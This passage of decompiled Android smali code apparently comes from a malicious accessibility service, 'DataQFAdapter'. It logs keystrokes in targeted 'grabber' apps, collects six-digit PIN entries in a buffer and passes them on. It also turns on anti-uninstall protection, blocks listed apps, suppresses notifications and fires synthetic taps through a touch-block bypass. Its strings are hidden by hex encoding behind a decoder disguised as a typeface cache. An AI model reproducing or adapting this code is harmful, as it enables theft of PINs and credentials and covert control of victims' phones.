    .line 18
    .line 19
    .line 20
    move-result v3

    .line 21
    if-eqz v3, :cond_1

    .line 22
    .line 23
    invoke-virtual/range {p1 .. p1}, Landroid/view/KeyEvent;->getKeyCode()I

    .line 24
    .line 25
    .line 26
    move-result v3

    .line 27
    const/16 v5, 0x3

    .line 28
    if-eq v3, v5, :cond_0

    .line 29
    .line 30
    const/4 v5, 0x4

    .line 31
    if-eq v3, v5, :cond_0

    .line 32
    .line 33
    const/16 v5, 0xbb

    .line 34
    .line 35
    if-eq v3, v5, :cond_0

    .line 36
    .line 37
    goto/16 :goto_0

    .line 38
    :cond_0
    return v4

    nop

    .line 39
    :catchall_0
    move-exception v0

    .line 40
    goto/16 :goto_3

    nop

    .line 41
    .line 42
    :cond_1
    :goto_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/KeyEvent;->getAction()I

    .line 43
    .line 44
    .line 45
    move-result v3

    nop

    nop

    .line 46
    if-nez v3, :cond_7

    .line 47
    .line 48
    invoke-virtual/range {p1 .. p1}, Landroid/view/KeyEvent;->getUnicodeChar()I

    .line 49
    .line 50
    .line 51
    move-result v3

    .line 52
    int-to-char v3, v3

    .line 53
    iget-object v9, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 54
    .line 55
    invoke-virtual {v9}, Ljava/lang/String;->length()I

    .line 56
    .line 57
    .line 58
    move-result v5

    .line 59
    if-lez v5, :cond_7

    .line 60
    .line 61
    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 62
    .line 63
    .line 64
    move-result-object v5

    nop

    .line 65
    invoke-virtual {v9, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 66
    .line 67
    .line 68
    move-result v5

    .line 69
    if-nez v5, :cond_7

    .line 70
    .line 71
    invoke-static {v3}, Ljava/lang/Character;->isDigit(C)Z

    .line 72
    .line 73
    .line 74
    move-result v15

    nop

    .line 75
    invoke-static {v3}, Ljava/lang/Character;->isLetterOrDigit(C)Z

    .line 76
    .line 77
    .line 78
    move-result v5

    .line 79
    if-nez v15, :cond_2

    .line 80
    .line 81
    if-eqz v5, :cond_7

    .line 82
    .line 83
    :cond_2
    iget-object v5, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentAppName:Ljava/lang/String;

    .line 84
    .line 85
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    .line 86
    .line 87
    .line 88
    move-result v6

    .line 89
    if-nez v6, :cond_3

    .line 90
    .line 91
    move-object v8, v9

    .line 92
    goto/16 :goto_1

    .line 93
    :cond_3
    move-object v8, v5

    .line 94
    :goto_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 95
    .line 96
    .line 97
    move-result-wide v10

    .line 98
    sget-object v5, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 99
    .line 100
    move-object v6, v5

    nop

    nop

    .line 101
    new-instance v5, Lv/s/NxAMaDFbSCxW6M03f;

    .line 102
    .line 103
    move-object v7, v6

    .line 104
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 105
    .line 106
    .line 107
    move-result-object v6

    .line 108
    move-object v12, v7

    .line 109
    invoke-static {v3}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    .line 110
    .line 111
    .line 112
    move-result-object v7

    .line 113
    if-eqz v15, :cond_4

    nop

    .line 114
    .line 115
    const-string v13, "0033007F005500B800E000BE00D6"

    nop

    nop

    .line 116
    .line 117
    goto :goto_2

    .line 118
    :cond_4
    const-string v13, "0037007300430093"

    .line 119
    .line 120
    :goto_2
    invoke-static {v13}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 121
    .line 122
    .line 123
    move-result-object v13

    .line 124
    const/16 v14, 0x0

    .line 125
    move-object/from16 v16, v12

    .line 126
    .line 127
    move-object/from16 v12, v13

    nop

    .line 128
    move v13, v14

    .line 129
    const/16 v14, 0xc0

    .line 130
    .line 131
    move-object/from16 v4, v16

    .line 132
    .line 133
    invoke-direct/range {v5 .. v14}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;ZI)V

    .line 134
    .line 135
    .line 136
    invoke-virtual {v4, v5}, Lv/s/GARjgaGEpTotOxcl8vfe;->dDIMxZXP1V8HdM(Lv/s/NxAMaDFbSCxW6M03f;)V

    .line 137
    .line 138
    .line 139
    if-eqz v15, :cond_7

    .line 140
    .line 141
    sget-object v4, Lapp/mobilex/plus/services/DataQFAdapter;->grabberPackages:Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 142
    .line 143
    invoke-virtual {v4, v9}, Ljava/util/concurrent/ConcurrentHashMap$KeySetView;->contains(Ljava/lang/Object;)Z

    .line 144
    .line 145
    .line 146
    move-result v4

    .line 147
    if-eqz v4, :cond_7

    .line 148
    .line 149
    iget-object v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinPkg:Ljava/lang/String;

    .line 150
    .line 151
    invoke-virtual {v9, v4}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 152
    .line 153
    .line 154
    move-result v4

    nop

    nop

    .line 155
    if-eqz v4, :cond_5

    .line 156
    .line 157
    iget-wide v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinLastTime:J

    .line 158
    .line 159
    sub-long v4, v10, v4

    .line 160
    .line 161
    const-wide/16 v6, 0x3a98

    .line 162
    .line 163
    cmp-long v4, v4, v6

    .line 164
    .line 165
    if-lez v4, :cond_6

    .line 166
    .line 167
    :cond_5
    iget-object v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinBuffer:Ljava/lang/StringBuilder;

    .line 168
    .line 169
    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 170
    .line 171
    .line 172
    iput-object v9, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinPkg:Ljava/lang/String;

    .line 173
    .line 174
    :cond_6
    iget-object v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinBuffer:Ljava/lang/StringBuilder;

    .line 175
    .line 176
    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 177
    .line 178
    .line 179
    iput-wide v10, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinLastTime:J

    .line 180
    .line 181
    iget-object v3, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinBuffer:Ljava/lang/StringBuilder;

    .line 182
    .line 183
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->length()I

    .line 184
    .line 185
    .line 186
    move-result v3

    .line 187
    const/16 v4, 0x6

    .line 188
    if-lt v3, v4, :cond_7

    .line 189
    .line 190
    iget-object v3, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinBuffer:Ljava/lang/StringBuilder;

    .line 191
    .line 192
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 193
    .line 194
    .line 195
    move-result-object v3

    .line 196
    const-string v4, "0033007F0055"

    .line 197
    .line 198
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 199
    .line 200
    .line 201
    move-result-object v4

    nop

    .line 202
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 203
    .line 204
    .line 205
    move-result-object v0

    .line 206
    const/16 v5, 0x1

    .line 207
    invoke-static {v9, v3, v4, v0, v5}, Lv/s/GARjgaGEpTotOxcl8vfe;->vIJudZvPyTuNp(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 208
    .line 209
    .line 210
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinBuffer:Ljava/lang/StringBuilder;

    .line 211
    .line 212
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->setLength(I)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 213
    .line 214
    .line 215
    :cond_7
    return v2

    .line 216
    :goto_3
    const-string v3, "002C00780070008200E9009A00C400A2002D0062001B008200E200AD00DD00B500790036"

    .line 217
    .line 218
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 219
    .line 220
    .line 221
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 222
    .line 223
    .line 224
    return v2
.end method

.method public onServiceConnected()V
    .locals 6

    .line 1
    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    .line 2
    .line 3
    .line 4
    sput-object p0, Lapp/mobilex/plus/services/DataQFAdapter;->instance:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 5
    .line 6
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 7
    .line 8
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 9
    .line 10
    .line 11
    const/16 v0, 0x0

    .line 12
    :try_start_0
    const-string v1, "002100790054009300E300AB00C000A60033"

    nop

    nop

    .line 13
    .line 14
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 15
    .line 16
    .line 17
    move-result-object v1

    .line 18
    invoke-virtual {p0, v1, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 19
    .line 20
    .line 21
    move-result-object v1

    .line 22
    const-string v2, "gp"

    .line 23
    .line 24
    const/4 v3, 0x0

    .line 25
    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 26
    .line 27
    .line 28
    move-result-object v1

    .line 29
    if-eqz v1, :cond_3

    .line 30
    .line 31
    invoke-static {v1}, Lv/s/BS2kx9eAoOyDiNGAFlFk;->euF5Udt5Rqv3Qmea(Ljava/lang/CharSequence;)Z

    .line 32
    .line 33
    .line 34
    move-result v2

    .line 35
    if-eqz v2, :cond_0

    .line 36
    .line 37
    goto :goto_2

    .line 38
    :cond_0
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getGrabberPackages$cp()Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 39
    .line 40
    .line 41
    move-result-object v2

    .line 42
    invoke-virtual {v2}, Ljava/util/concurrent/ConcurrentHashMap$KeySetView;->clear()V

    .line 43
    .line 44
    .line 45
    const-string v2, "|"

    .line 46
    .line 47
    filled-new-array {v2}, [Ljava/lang/String;

    .line 48
    .line 49
    .line 50
    move-result-object v2

    .line 51
    invoke-static {v1, v2}, Lv/s/KgSM0TsKUpCiuePB;->K5l5kmuyJzrgUX(Ljava/lang/String;[Ljava/lang/String;)Ljava/util/List;

    .line 52
    .line 53
    .line 54
    move-result-object v1

    .line 55
    new-instance v2, Ljava/util/ArrayList;

    nop

    .line 56
    .line 57
    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    .line 58
    .line 59
    .line 60
    invoke-interface {v1}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    .line 61
    .line 62
    .line 63
    move-result-object v1

    .line 64
    :cond_1
    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    .line 65
    .line 66
    .line 67
    move-result v3

    .line 68
    if-eqz v3, :cond_2

    .line 69
    .line 70
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 71
    .line 72
    .line 73
    move-result-object v3

    .line 74
    move-object/from16 v4, v3

    .line 75
    check-cast v4, Ljava/lang/String;

    .line 76
    .line 77
    invoke-static {v4}, Lv/s/BS2kx9eAoOyDiNGAFlFk;->euF5Udt5Rqv3Qmea(Ljava/lang/CharSequence;)Z

    .line 78
    .line 79
    .line 80
    move-result v4

    .line 81
    if-nez v4, :cond_1

    .line 82
    .line 83
    invoke-virtual {v2, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 84
    .line 85
    .line 86
    goto :goto_0

    .line 87
    :cond_2
    invoke-virtual {v2}, Ljava/util/ArrayList;->size()I

    .line 88
    .line 89
    .line 90
    move-result v1

    .line 91
    move v3, v0

    .line 92
    :goto_1
    if-ge v3, v1, :cond_3

    .line 93
    .line 94
    invoke-virtual {v2, v3}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    .line 95
    .line 96
    .line 97
    move-result-object v4

    .line 98
    add-int/lit8 v3, v3, 0x1

    .line 99
    .line 100
    check-cast v4, Ljava/lang/String;

    .line 101
    .line 102
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getGrabberPackages$cp()Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 103
    .line 104
    .line 105
    move-result-object v5

    .line 106
    invoke-virtual {v5, v4}, Ljava/util/concurrent/ConcurrentHashMap$KeySetView;->add(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 107
    .line 108
    .line 109
    goto :goto_1

    .line 110
    :catch_0
    :cond_3
    :goto_2
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->loadUiBlockPrefs()V

    .line 111
    .line 112
    .line 113
    const-string v1, "00150058007800C700D100BC00D100A2003000650052008500F900B300DB00B3003A00360068008200E200A900DB00A4002600360058008800FE00B100D700A400370073005F"

    nop

    nop

    .line 114
    .line 115
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 116
    .line 117
    .line 118
    :try_start_1
    const-string v1, "window"

    .line 119
    .line 120
    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 121
    .line 122
    .line 123
    move-result-object v1

    .line 124
    check-cast v1, Landroid/view/WindowManager;

    .line 125
    .line 126
    sput-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;

    .line 127
    .line 128
    const-string v1, "000200750058008200E300AC00E500AE002D00720054009000B000B600DC00AE0037007F005A008B00F900A500D700A3"

    nop

    nop

    .line 129
    .line 130
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 131
    .line 132
    .line 133
    goto/16 :goto_3

    .line 134
    :catch_1
    move-exception v1

    .line 135
    const-string v2, "000500770052008B00F500BB009200B3002C00360052008900F900AB0092008600200075005E009400E3008800DB00A900270079004C00DD00B0"

    .line 136
    .line 137
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 138
    .line 139
    .line 140
    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 141
    .line 142
    .line 143
    :goto_3
    const/4 v1, 0x1

    nop

    .line 144
    sput-boolean v1, Lapp/mobilex/plus/services/DataQFAdapter;->antiUninstallEnabled:Z

    .line 145
    .line 146
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->blockedApps:Ljava/util/Set;

    .line 147
    .line 148
    const-string v3, "00200079005600C900F100B100D600B5002C007F005F00C900E300BA00C600B3002A0078005C0094"

    .line 149
    .line 150
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 151
    .line 152
    .line 153
    move-result-object v3

    .line 154
    const-string v4, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900E300BA00C600B3002A0078005C0094"

    .line 155
    .line 156
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 157
    .line 158
    .line 159
    move-result-object v4

    .line 160
    const-string v5, "00200079005600C900F100B100D600B5002C007F005F00C900E000AD00DD00B1002A0072005E009500E300F100C100A2003700620052008900F700AC"

    .line 161
    .line 162
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 163
    .line 164
    .line 165
    move-result-object v5

    .line 166
    filled-new-array {v3, v4, v5}, [Ljava/lang/String;

    .line 167
    .line 168
    .line 169
    move-result-object v3

    .line 170
    invoke-static {v3}, Lv/s/Aqh0grSwgDbwr;->yTljMGnIibTRdOpSh4([Ljava/lang/Object;)Ljava/util/List;

    .line 171
    .line 172
    .line 173
    move-result-object v3

    .line 174
    invoke-interface {v2, v3}, Ljava/util/Set;->addAll(Ljava/util/Collection;)Z

    .line 175
    .line 176
    .line 177
    invoke-static {}, Lv/s/oJLsXXGxdTuQpIRpV;->dDIMxZXP1V8HdM()Z

    .line 178
    .line 179
    .line 180
    move-result v2

    nop

    .line 181
    if-eqz v2, :cond_5

    .line 182
    .line 183
    const-wide/16 v2, 0x0

    .line 184
    .line 185
    sput-wide v2, Lapp/mobilex/plus/services/DataQFAdapter;->serviceStartTime:J

    .line 186
    .line 187
    sget-object v2, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    .line 188
    .line 189
    invoke-static {p0}, Lv/s/VpKcDcuRNaQkRJ5;->ibVTtJUNfrGYbW(Landroid/content/Context;)Z

    .line 190
    .line 191
    .line 192
    move-result v2

    .line 193
    if-eqz v2, :cond_4

    .line 194
    .line 195
    sput-boolean v0, Lv/s/VpKcDcuRNaQkRJ5;->xDyLpEZyrcKVe0:Z

    .line 196
    .line 197
    const-string v2, "00020078004F008E00BD00AA00DC00AE002D0065004F008600FC00B3009200A60031007B005E008300B000F700DB00AA002E0073005F008E00F100AB00D700EE006F0036004B008E00E000BA00DE00AE002D0073001B008600FC00AD00D700A60027006F001B008300FF00B100D700E720570036005A009200E400B000F100AB002A0075005000C700DF009900F4"

    .line 198
    .line 199
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 200
    .line 201
    .line 202
    goto :goto_4

    .line 203
    :cond_4
    sput-boolean v1, Lv/s/VpKcDcuRNaQkRJ5;->xDyLpEZyrcKVe0:Z

    .line 204
    .line 205
    const-string v2, "00020078004F008E00BD00AA00DC00AE002D0065004F008600FC00B3009200A60031007B005E008300B000F700DB00AA002E0073005F008E00F100AB00D700EE006F0036007A009200E400B000F100AB002A0075005000C700DF0091009200A1002C0064001B009700F900AF00D700AB002A0078005E"

    .line 206
    .line 207
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 208
    .line 209
    .line 210
    goto :goto_4

    .line 211
    :cond_5
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 212
    .line 213
    .line 214
    move-result-wide v2

    .line 215
    sput-wide v2, Lapp/mobilex/plus/services/DataQFAdapter;->serviceStartTime:J

    .line 216
    .line 217
    const-string v2, "00020078004F008E00BD00AA00DC00AE002D0065004F008600FC00B3009200A60031007B005E008300B000F700D600A2002F00770042008200F400FF"

    .line 218
    .line 219
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 220
    .line 221
    .line 222
    const-string v2, "002E00650012"

    .line 223
    .line 224
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 225
    .line 226
    .line 227
    :goto_4
    :try_start_2
    const-string v2, "notification"

    .line 228
    .line 229
    invoke-virtual {p0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 230
    .line 231
    .line 232
    move-result-object v2

    .line 233
    check-cast v2, Landroid/app/NotificationManager;

    .line 234
    .line 235
    const/16 v3, 0x1389

    .line 236
    .line 237
    invoke-virtual {v2, v3}, Landroid/app/NotificationManager;->cancel(I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 238
    .line 239
    .line 240
    :catch_2
    invoke-static {}, Lv/s/oJLsXXGxdTuQpIRpV;->dDIMxZXP1V8HdM()Z

    .line 241
    .line 242
    .line 243
    move-result v2

    .line 244
    if-eqz v2, :cond_6

    .line 245
    .line 246
    :try_start_3
    const-string v2, "00300073004F009200E0008000C200B5002600700048"

    nop

    nop

    .line 247
    .line 248
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 249
    .line 250
    .line 251
    move-result-object v2

    .line 252
    invoke-virtual {p0, v2, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 253
    .line 254
    .line 255
    move-result-object v0

    .line 256
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    .line 257
    .line 258
    .line 259
    move-result-object v0

    .line 260
    const-string v2, "00300073004F009200E0008000D100A8002E00660057008200E400BA"

    .line 261
    .line 262
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 263
    .line 264
    .line 265
    move-result-object v2

    .line 266
    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 267
    .line 268
    .line 269
    move-result-object v0

    .line 270
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 271
    .line 272
    .line 273
    :catch_3
    sget-object v0, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    .line 274
    .line 275
    sget-boolean v0, Lv/s/VpKcDcuRNaQkRJ5;->JXn4Qf7zpnLjP5:Z

    .line 276
    .line 277
    if-nez v0, :cond_6

    .line 278
    .line 279
    invoke-static {p0}, Lv/s/VpKcDcuRNaQkRJ5;->ibVTtJUNfrGYbW(Landroid/content/Context;)Z

    .line 280
    .line 281
    .line 282
    move-result v0

    .line 283
    if-nez v0, :cond_6

    .line 284
    .line 285
    const-string v0, "002C00780068008200E200A900DB00A4002600550054008900FE00BA00D100B300260072000100C700E300AB00D300B50037007F0055008000B000AF00DB00B70026007A0052008900F500FF00FB008A000E0053007F00AE00D1008B00F7008B001A"

    .line 286
    .line 287
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 288
    .line 289
    .line 290
    invoke-static {p0}, Lv/s/VpKcDcuRNaQkRJ5;->nQilHWaqS401ZtR(Landroid/content/Context;)V

    .line 291
    .line 292
    .line 293
    :cond_6
    new-instance v0, Landroid/os/Handler;

    .line 294
    .line 295
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 296
    .line 297
    .line 298
    move-result-object v2

    .line 299
    invoke-direct {v0, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 300
    .line 301
    .line 302
    new-instance v2, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 303
    .line 304
    invoke-direct {v2, p0, v1}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 305
    .line 306
    .line 307
    const-wide/16 v3, 0x1f4

    .line 308
    .line 309
    invoke-virtual {v0, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 310
    .line 311
    .line 312
    new-instance v0, Landroid/os/Handler;

    .line 313
    .line 314
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 315
    .line 316
    .line 317
    move-result-object v1

    .line 318
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 319
    .line 320
    .line 321
    new-instance v1, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 322
    .line 323
    const/16 v2, 0x2

    .line 324
    invoke-direct {v1, p0, v2}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 325
    .line 326
    .line 327
    const-wide/16 v2, 0xbb8

    .line 328
    .line 329
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 330
    .line 331
    .line 332
    new-instance v0, Ljava/lang/Thread;

    .line 333
    .line 334
    new-instance v1, Lv/s/TgFV4UY0xAiKxQwpKNg;

    nop

    .line 335
    .line 336
    const/16 v2, 0x3

    nop

    .line 337
    invoke-direct {v1, p0, v2}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 338
    .line 339
    .line 340
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 341
    .line 342
    .line 343
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 344
    .line 345
    .line 346
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->startGuardPollThread()V

    .line 347
    .line 348
    .line 349
    return-void
.end method

.method public final performClick(II)Z
    .locals 7

    .line 1
    :try_start_0
    new-instance v1, Landroid/graphics/Path;

    .line 2
    .line 3
    invoke-direct {v1}, Landroid/graphics/Path;-><init>()V

    .line 4
    .line 5
    .line 6
    int-to-float v0, p1

    .line 7
    int-to-float v2, p2

    .line 8
    invoke-virtual {v1, v0, v2}, Landroid/graphics/Path;->moveTo(FF)V

    .line 9
    .line 10
    .line 11
    new-instance v6, Landroid/accessibilityservice/GestureDescription$Builder;

    .line 12
    .line 13
    invoke-direct {v6}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    .line 14
    .line 15
    .line 16
    new-instance v0, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    .line 17
    .line 18
    const-wide/16 v2, 0x0

    .line 19
    .line 20
    const-wide/16 v4, 0x1

    .line 21
    .line 22
    invoke-direct/range {v0 .. v5}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    .line 23
    .line 24
    .line 25
    invoke-virtual {v6, v0}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    .line 26
    .line 27
    .line 28
    invoke-virtual {v6}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    .line 29
    .line 30
    .line 31
    move-result-object v0

    .line 32
    const-string v1, "0000007A0052008400FB00F7"

    .line 33
    .line 34
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 35
    .line 36
    .line 37
    move-result-object v1

    .line 38
    new-instance v2, Ljava/lang/StringBuilder;

    nop

    nop

    .line 39
    .line 40
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 41
    .line 42
    .line 43
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 44
    .line 45
    .line 46
    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 47
    .line 48
    .line 49
    const-string p1, ","

    .line 50
    .line 51
    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 52
    .line 53
    .line 54
    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 55
    .line 56
    .line 57
    const-string p1, ")"

    .line 58
    .line 59
    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 60
    .line 61
    .line 62
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 63
    .line 64
    .line 65
    move-result-object p1

    nop

    .line 66
    invoke-direct {p0, v0, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->dispatchWithTouchBlockBypass(Landroid/accessibilityservice/GestureDescription;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 67
    .line 68
    .line 69
    const/4 p1, 0x1

    .line 70
    return p1

    .line 71
    :catch_0
    move-exception v0

    .line 72
    move-object p1, v0

    .line 73
    const-string p2, "003300730049008100FF00AD00DF0084002F007F0058008C00B000BA00C000B5002C0064000100C7"

    .line 74
    .line 75
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 76
    .line 77
    .line 78
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 79
    .line 80
    .line 81
    const/4 p1, 0x0

    .line 82
    return p1
.end method

.method public final performKeyEvent(I)Z
    .locals 8

    .line 1
    const/4 v0, 0x0

    .line 2
    :try_start_0
